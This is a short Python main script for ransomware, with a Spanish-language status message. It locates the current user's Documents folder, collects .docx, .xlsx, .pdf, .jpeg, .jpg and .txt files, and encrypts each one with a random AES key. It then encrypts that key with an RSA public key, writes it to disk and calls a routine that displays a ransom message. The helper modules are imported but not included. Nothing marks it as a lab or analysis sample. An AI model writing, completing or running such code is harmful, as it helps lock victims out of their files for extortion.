import os
import secrets

from encryption_utils import load_public_key, encrypt_aes_key
from file_handling import find_files, encrypt_file, display_ransom_message

def main():
    target_directory = os.path.join(os.getenv('USERPROFILE'), 'Documents')
    print("Ruta del directorio objetivo:", target_directory)

    extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
    files = find_files(target_directory, extensions)
    
    aes_key = secrets.token_bytes(32)
    
    public_key_path = os.path.abspath("public_key.pem")
    public_key = load_public_key(public_key_path)
    
    for file in files:
        encrypt_file(file, aes_key)
    
    encrypted_aes_key = encrypt_aes_key(aes_key, public_key)
    with open('encrypted_aes_key.bin', 'wb') as key_file:
        key_file.write(encrypted_aes_key)
    
    display_ransom_message()

if __name__ == "__main__":
    main()